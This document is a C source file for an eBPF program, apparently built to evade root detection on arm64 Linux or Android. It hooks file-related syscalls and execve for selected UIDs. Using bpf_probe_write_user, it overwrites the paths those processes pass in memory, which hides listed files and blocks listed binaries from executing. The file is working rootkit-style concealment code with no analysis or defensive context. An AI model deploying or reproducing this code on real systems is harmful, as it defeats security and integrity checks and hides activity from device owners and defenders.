
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <vmlinux.h>

#include "evade_root.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// uids to watch
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(__u32));
    __uint(value_size, sizeof(__u32));
    __uint(max_entries, MAX_UIDS);
} uids_to_watch SEC(".maps");

// files to hide
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(struct fs_hide_key));
    __uint(value_size, sizeof(__u32));
    __uint(max_entries, MAX_KEYS);
} files_to_hide_hm SEC(".maps");

// tasks to mute
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(key_size, sizeof(struct task_name));
    __uint(value_size, sizeof(__u32));
    __uint(max_entries, MAX_KEYS);
} tasks_to_mute SEC(".maps");

/* decide if we should let the process do execve to a specific binary */
static bool should_mute(struct task_name* task) {
    u32* value = bpf_map_lookup_elem(&tasks_to_mute, task);
    return value != NULL;
}

/* decide if we should hook the current process based on its uid */
static bool should_hook() {
    uint32_t uid = (bpf_get_current_uid_gid() & 0x00000000FFFFFFFF);
    u32* value = bpf_map_lookup_elem(&uids_to_watch, &uid);
    return value != NULL;
}

/* decide if we should hide this path */
static bool should_hide(struct fs_hide_key* key) {
    long* value = 0;
    value = bpf_map_lookup_elem(&files_to_hide_hm, key);
    // bpf_printk("searching key 0x%x-%d-%s\n", key->st_dev, key->inode, key->path);
    if (value == NULL) {
        // bpf_printk("key 0x%x-%d-%s not found!!\n", key->st_dev, key->inode, key->path);
        return false;
    }
    bpf_printk("[+] Hiding 0x%x-%d-%s\n", key->st_dev, key->inode, key->path);
    return true;
}

static inline __attribute__((always_inline)) void handle_fs_syscall(enum syscall_id syscall,
                                                                    struct pt_regs* ctx) {
    if (!should_hook()) {
        return;
    }
    // bpf_printk("handling %s syscall\n", syscall_names_str[syscall]);
    struct pt_regs* sys_ctx = PT_REGS_SYSCALL_REGS(ctx);
    unsigned int fd;
    const char* path;
    char empty[] = EMPTY;
    int error = bpf_probe_read(&fd, sizeof(fd), &PT_REGS_PARM1(sys_ctx));
    if (error != 0) {
        // bpf_printk("Error %d reading fd in %s\n", error, syscall);
    }
    error = bpf_probe_read(&path, sizeof(path), &PT_REGS_PARM2(sys_ctx));
    if (error != 0) {
        // bpf_printk("Error %d reading filepath in %s\n", error, syscall);
    }
    struct fs_hide_key key = {0};
    error = bpf_probe_read_user_str(&key.path, sizeof(key.path), path);
    if (error < 0) {
        // bpf_printk("Error %d reading str from userland\n", error);
    }
    /* modify the parameter, we can do this because the path char * points to
    userland memory */
    if (should_hide(&key)) {
        /* modify the parameter, we can do this because the path char * points to
           userland memory */
        bpf_probe_write_user((void*)path, (void*)empty, sizeof(char));
    }
}

SEC("kprobe/__arm64_sys_unlinkat")
int x64_sys_unlinkat(struct pt_regs* ctx) {
    handle_fs_syscall(UNLINKAT, ctx);
    return 0;
}

SEC("kprobe/__arm64_sys_newfstatat")
int x64_sys_newfstatat(struct pt_regs* ctx) {
    handle_fs_syscall(NEWFSTATAT, ctx);
    return 0;
}

SEC("kprobe/__arm64_sys_openat")
int x64_sys_openat(struct pt_regs* ctx) {
    handle_fs_syscall(OPENAT, ctx);
    return 0;
}

SEC("kprobe/__arm64_sys_faccessat")
int x64_sys_faccessat(struct pt_regs* ctx) {
    handle_fs_syscall(FACCESSAT, ctx);
    return 0;
}

SEC("kprobe/__arm64_sys_execve")
int x64_sys_execve(struct pt_regs* ctx) {
    if (!should_hook()) return 0;
    struct pt_regs* sys_ctx = PT_REGS_SYSCALL_REGS(ctx);
    char* cmd;
    char empty[] = EMPTY;
    /* read path (char *) to the image that execve will be running */
    int error = bpf_probe_read(&cmd, sizeof(char*), &PT_REGS_PARM1(sys_ctx));
    struct task_name task = {0};
    /* read string pointed by char * cmd */
    error = bpf_probe_read_user_str(&task.name, MAX_COMM_LEN, cmd);
    if (should_mute(&task)) {
        bpf_printk("[+] Mutting task %s", task.name);
        /* smash the value in userland memory */
        error = bpf_probe_write_user((void*)cmd, (void*)empty, sizeof(char));
    }
    return 0;
}
